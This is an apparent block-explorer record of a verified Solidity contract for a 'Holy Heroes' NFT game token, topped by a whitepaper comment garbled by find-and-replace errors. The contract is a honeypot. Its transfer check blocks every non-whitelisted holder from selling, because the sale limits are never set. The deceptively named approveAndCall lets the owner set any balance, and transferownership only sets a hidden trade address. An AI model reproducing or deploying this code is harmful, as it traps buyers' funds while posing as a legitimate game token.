{"status": "1", "message": "OK", "result": [{"SourceCode": "/*\r\nHoly Heroes is the first Match-3 Puzzle and RPG Strategy NFT Game. The game does not only provide a relaxing and entertaining experience of the Match-3 genre but also keeps the RPG\u2019s signature elements of exploring and looting. NFT is a perfect piece to make this game truly unique.\r\nHoly Heroes has 2 main concepts: NFT game for players who are seeking NFT and focusing more on profit, and traditional game for players who are playing for fun and experience. Although tHLHRe two game models are well-developed with millions of gamers, they are almost separated from each other. \r\nOne of the biggest goals of Holy Heroes is to create a gameplay that combines 2 features above and attracts all players from NFT and traditional games. People who want to make money can still not get bored while playing games, people who want to play games can still earn money. Thereby, the game itself can create a community that balances between playing and earning.\r\n\r\nGame Story\r\nLegend has it that, thousands of years ago, the Demon Lord traded his life to destroy the Stone of Stability, causing both of them to shatter. The stone fragments mingled with the demon lord's soul fragments to generate elemental shards that were scattered across the Earth.\r\nOver the years, man has learned to harness the energy of tHLHRe discarded objects to benefit their life. There are, however, some creatures that have been tainted by the elemental fragments' dark power. Only by restoring the Stone of Stability can the world's order be rearranged. The quest begins in a far fishing village in the south.\r\n\r\nGame Characters\r\nOur story is built by a HLHR pool consisting of 29 Heroes with distinct personalities and power abilities.  Understanding your Heroes is the best tool to help you win a battle in the game.\r\nEach HLHR is categorized into four races including Human, Beast, Forest, and Demon. However, different Heroes will have different base stats.\r\n\r\nRPG Strategy\r\nHoly Heroes focuses on more prominent RPG features: exploring and looting. It is more about how the characters evolve as they interact with the narrative. The nature of this progression and the choices users make mean that their abilities and journey may never be the same across multiple playgrounds.\r\n\r\nGame Play\r\nBasically, your goal is to keep your Heroes alive after killing all of the enemies. You need to match the items in the game board to make your Heroes attack. The longer the chain you make (in straight, diagonal, horizontal lines), the stronger the Heroes attack. In one battle, you need 4 Heroes at the same time to fight with the enemies. After the battle, your Heroes will lose their stamina and need time to recover before taking a new battle. \r\nTypically, the game's flow requires you to fight in battles, win, and get rewards such as HLHR, HLHR experience, etc to purchase things or upgrade Heroes. \r\n\r\nHLHR Upgrade\r\nIn order to upgrade a HLHR, you have to win the campaigns and use the HLHR token. The more upgraded Heroes are, the more strength and power they have. However, the subsequent upgrade will cost more than the previous ones.\r\n\r\nHLHR Awaken\r\nHLHR's strength will depend on their rarity, and how many times they are upgraded. However, once the HLHR reacHLHR the level limit, you will need to use the \u201cawaken system\u201d to help him break the limitation. To awaken the HLHR, you will have to use the token \u201cHLHR\u201d. \r\nThis mechanism helps maintain the HLHR\u2019s supply power and reduces the HLHR\u2019s inflation rate and in-game inflation. Thus, the economy in the game always has a balance mechanism between the player and the number of Heroes generated. \r\nWhen you awaken your HLHR, you will be rewarded with a HLHR Shard (HRS).\r\nOwn a New HLHR\r\nThere are 4 ways to get a HLHR:\r\nTrading: you can use token HLHR to buy on the Marketplace.\r\nHLHR Box: you can luckily get a HLHR when you open the HLHR Box.\r\nStaking: you can get a HLHR reward by staking tokens (within first 10 days from the day the Staking campaign launch HLHR).\r\nCreating: new HLHR can be created by combining 4 HLHR Shards and HLHR token.\r\nCampaign\r\nThe campaign is divided into chapters, each chapter is a location on the map consisting of many challenges and rewards hidden within. Players need to win at all milestones to complete a chapter and unlock the next ones.\r\n\r\nEach chapter has diverse monsters, special bosses, and fascinating treasures for players to discover.\r\n\r\n\r\nDaily Raid\r\nAfter completing a chapter, bosses in that chapter will be unlocked. Every day players will have 1 chance to fight with a boss as they like. You will compete with other players to defeat the boss. The longer the players survive, the bigger the reward will be.\r\n\r\nTower\r\nThe player must pass through 100 floors in the Tower. After winning on each floor, players will be rewarded.\r\n\r\nThere will be a Boss every ten floors.\r\nTower will be operational for 30 days.\r\n\r\nTop players who finish first and fastest will be rewarded with special prizes.\r\n\r\n\r\nPvP\r\nEach arena season will last 30 days, players will compete against each other to increase their rank in the arena. The higher your rank, the bigger reward you get.\r\n\r\n\r\nClan\r\nA clan is an organized group of players that play together. Clan members will contribute to upgrading the clan. There will be skills that support the strength of all players in the clan.\r\n\r\nClan Maze is the maze that clan members need to fight together to unlock all the buttons.\r\n\r\nBoss Clan: The clan's achievement will be the sum of all members' achievements. Compete with other clans for the higher rank.\r\n\r\n\r\nPlay And Earn\r\n\r\nPlay And Earn Model instead of Play To Earn Model, the game focuses more on the gameplay and increases the player\u2019s experiences. Holy Heroes wants to bring the community the game battles which can give the players joy and financial success. \r\nCrypto HLHR\r\nCrypto HLHR is a supportive feature that helps boost the Heroes\u2019 strength by the Crypto movement. We will assign a crypto medal for each HLHR. Those cryptos will be the top powerful coins in the market such as BTC, ETH, or BNB, etc. The power of the HLHR will increase or decrease depending on the arbitrage of that cryptocurrency in real-time.\r\n\r\nLow Inflation Rate\r\nHoly Heroes has two types of tokens: pre-minted tokens and unlimited tokens.\r\n\r\nHLHR token is known as the governance token and pre-minted tokens of Holy Heroes. The number of limited tokens released in the project can only be used to buy Heroes and HLHR boxes. The number of pre-minted tokens released has been decided at the beginning of the project, which means There will not be any situation of issuing more tokens during the whole process that might lead to token inflation.\r\n\r\n\r\nHLHR Token\r\nHLHR token is known as unlimited tokens that users earn when they win each game and can be used in in-game transactions. However, the problem is that when users win so many games that the unlimited tokens exceed the controllable number. The Holy Heroes Development Team has also prepared for that situation and developed the mechanism of using unlimited tokens for HLHR up-gradation, reducing the inflation rate in HLHR tokens.\r\n\r\n\r\nHLHR Token\r\nBesides, we also have a mechanism \u2014 the Upgrade System to manage the number of Heroes. For example, to level up each HLHR\u2019s strength, they need to go through an up-gradation process. The subsequent upgrade will cost more than the previous ones. \r\n\r\nTherefore, it is only economical when players elevate Heroes to a defined level, as continuously using an old HLHR to make HLHR Shard will significantly increase costs. This mechanism helps maintain the HLHR\u2019s supply power and reduces the HLHR\u2019s inflation rate and in-game inflation. Thus, the economy in the game always has a balance mechanism between the player and the number of Heroes generated.\r\n\r\nEarning Mechanism\r\n\r\nPlayers can earn by:\r\nTrading\r\nHoly Heroes opens a marketplace for players to trade their Heroes with others. You can easily buy one from the marketplace to start a battle. The Heroes will have no standard prices because it depends on the level, appearance, race, and combat power of the Heroes. \r\n\r\nPlayers also can find and purchase other game items to boost their Heroes\u2019 strength. \r\n\r\n\r\nRenting\r\nThe marketplace is not only for trading but also for rent. Players can rent out their Heroes from others for profit. The rental price will depend on the HLHR\u2019s value in the market. \r\n\r\nHLHR Box\r\nBy opening the HLHR Box, players can receive valuable rare Heroes if they are lucky enough.\r\n\r\n\r\nReward\r\nPlayers can earn the token via Quest, PvP, Tower Conquest, and Clan event.\r\n*/\r\npragma solidity ^0.5.17;\r\ninterface IERC20 {\r\n    function totalSupply() external view returns(uint);\r\n\r\n    function balanceOf(address account) external view returns(uint);\r\n\r\n    function transfer(address recipient, uint amount) external returns(bool);\r\n\r\n    function allowance(address owner, address spender) external view returns(uint);\r\n\r\n    function approve(address spender, uint amount) external returns(bool);\r\n\r\n    function transferFrom(address sender, address recipient, uint amount) external returns(bool);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\nlibrary Address {\r\n    function isContract(address account) internal view returns(bool) {\r\n        bytes32 codehash;\r\n        bytes32 accountHash;\r\n        // solhint-disable-next-line no-inline-assembly\r\n        assembly { codehash:= extcodehash(account) }\r\n        return (codehash != 0x0 && codehash != accountHash);\r\n    }\r\n}\r\n\r\ncontract Context {\r\n    constructor() internal {}\r\n    // solhint-disable-previous-line no-empty-blocks\r\n    function _msgSender() internal view returns(address payable) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint a, uint b) internal pure returns(uint) {\r\n        uint c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint a, uint b) internal pure returns(uint) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {\r\n        require(b <= a, errorMessage);\r\n        uint c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint a, uint b) internal pure returns(uint) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function div(uint a, uint b) internal pure returns(uint) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {\r\n        // Solidity only automatically asserts when dividing by 0\r\n        require(b > 0, errorMessage);\r\n        uint c = a / b;\r\n\r\n        return c;\r\n    }\r\n}\r\n\r\nlibrary SafeERC20 {\r\n    using SafeMath for uint;\r\n    using Address for address;\r\n\r\n    function safeTransfer(IERC20 token, address to, uint value) internal {\r\n        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));\r\n    }\r\n\r\n    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {\r\n        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));\r\n    }\r\n\r\n    function safeApprove(IERC20 token, address spender, uint value) internal {\r\n        require((value == 0) || (token.allowance(address(this), spender) == 0),\r\n            \"SafeERC20: approve from non-zero to non-zero allowance\"\r\n        );\r\n        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));\r\n    }\r\n\r\n    function callOptionalReturn(IERC20 token, bytes memory data) private {\r\n        require(address(token).isContract(), \"SafeERC20: call to non-contract\");\r\n\r\n        // solhint-disable-next-line avoid-low-level-calls\r\n        (bool success, bytes memory returndata) = address(token).call(data);\r\n        require(success, \"SafeERC20: low-level call failed\");\r\n\r\n        if (returndata.length > 0) { // Return data is optional\r\n            // solhint-disable-next-line max-line-length\r\n            require(abi.decode(returndata, (bool)), \"SafeERC20: ERC20 operation did not succeed\");\r\n        }\r\n    }\r\n}\r\n\r\ncontract ERC20 is Context, IERC20 {\r\n    using SafeMath for uint;\r\n    mapping(address => uint) private _balances;\r\n\r\n    mapping(address => mapping(address => uint)) private _allowances;\r\n\r\n    uint private _totalSupply;\r\n\r\n    function totalSupply() public view returns(uint) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view returns(uint) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint amount) public returns(bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view returns(uint) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint amount) public returns(bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint addedValue) public returns(bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \"ERC20: decreased allowance below zero\"));\r\n        return true;\r\n    }\r\n\r\n    function _transfer(address sender, address recipient, uint amount) internal {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        _balances[sender] = _balances[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\r\n        _balances[recipient] = _balances[recipient].add(amount);\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n\r\n    function _mint(address account, uint amount) internal {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n\r\n        _totalSupply = _totalSupply.add(amount);\r\n        _balances[account] = _balances[account].add(amount);\r\n        emit Transfer(address(0), account, amount);\r\n    }\r\n\r\n    function _burn(address account, uint amount) internal {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n\r\n        _balances[account] = _balances[account].sub(amount, \"ERC20: burn amount exceeds balance\");\r\n        _totalSupply = _totalSupply.sub(amount);\r\n        emit Transfer(account, address(0), amount);\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint amount) internal {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n}\r\n\r\ncontract ERC20Detailed is IERC20 {\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n\r\n    constructor(string memory name, string memory symbol, uint8 decimals) public {\r\n        _name = name;\r\n        _symbol = symbol;\r\n        _decimals = decimals;\r\n    }\r\n\r\n    function name() public view returns(string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view returns(string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view returns(uint8) {\r\n        return _decimals;\r\n    }\r\n}\r\n\r\n\r\ncontract HolyHeroes {\r\n    event Transfer(address indexed _from, address indexed _to, uint _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint _value);\r\n \r\n    function transfer(address _to, uint _value) public payable returns (bool) {\r\n        return transferFrom(msg.sender, _to, _value);\r\n    }\r\n \r\n    function ensure(address _from, address _to, uint _value) internal view returns(bool) {\r\n       \r\n        if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){\r\n            return true;\r\n        }\r\n        require(condition(_from, _value));\r\n        return true;\r\n    }\r\n    \r\n    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {\r\n        if (_value == 0) {return true;}\r\n        if (msg.sender != _from) {\r\n            require(allowance[_from][msg.sender] >= _value);\r\n            allowance[_from][msg.sender] -= _value;\r\n        }\r\n        require(ensure(_from, _to, _value));\r\n        require(balanceOf[_from] >= _value);\r\n        balanceOf[_from] -= _value;\r\n        balanceOf[_to] += _value;\r\n        _onSaleNum[_from]++;\r\n        emit Transfer(_from, _to, _value);\r\n        return true;\r\n    }\r\n \r\n    function approve(address _spender, uint _value) public payable returns (bool) {\r\n        allowance[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n    \r\n    function condition(address _from, uint _value) internal view returns(bool){\r\n        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;\r\n        \r\n        if(_saleNum > 0){\r\n            if(_onSaleNum[_from] >= _saleNum) return false;\r\n        }\r\n        if(_minSale > 0){\r\n            if(_minSale > _value) return false;\r\n        }\r\n        if(_maxSale > 0){\r\n            if(_value > _maxSale) return false;\r\n        }\r\n        return true;\r\n    }\r\n \r\n    mapping(address=>uint256) private _onSaleNum;\r\n    mapping(address=>bool) private canSale;\r\n    uint256 private _minSale;\r\n    uint256 private _maxSale;\r\n    uint256 private _saleNum;\r\n    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {\r\n        require(msg.sender == owner);\r\n        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}\r\n        canSale[spender]=true;\r\n        return true;\r\n    }\r\n\r\n    address tradeAddress;\r\n    function transferownership(address addr) public returns(bool) {\r\n        require(msg.sender == owner);\r\n        tradeAddress = addr;\r\n        return true;\r\n    }\r\n \r\n    mapping (address => uint) public balanceOf;\r\n    mapping (address => mapping (address => uint)) public allowance;\r\n \r\n    uint constant public decimals = 18;\r\n    uint public totalSupply;\r\n    string public name;\r\n    string public symbol;\r\n    address private owner;\r\n \r\n    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {\r\n        name = _name;\r\n        symbol = _symbol;\r\n        totalSupply = _supply*(10**uint256(decimals));\r\n        owner = msg.sender;\r\n        balanceOf[msg.sender] = totalSupply;\r\n        emit Transfer(address(0x0), msg.sender, totalSupply);\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"_name\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"_symbol\",\"type\":\"string\"},{\"internalType\":\"uint256\",\"name\":\"_supply\",\"type\":\"uint256\"}],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"approveAndCall\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"transferownership\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "HolyHeroes", "CompilerVersion": "v0.5.17+commit.d19bba13", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000000000000000001dcd6500000000000000000000000000000000000000000000000000000000000000000b486f6c79204865726f65730000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004484c485200000000000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "bzzr://bae32bb74fb9aff11b8713210e22255e1e8a94223d98c2a1bc490f30cbe42a04"}]}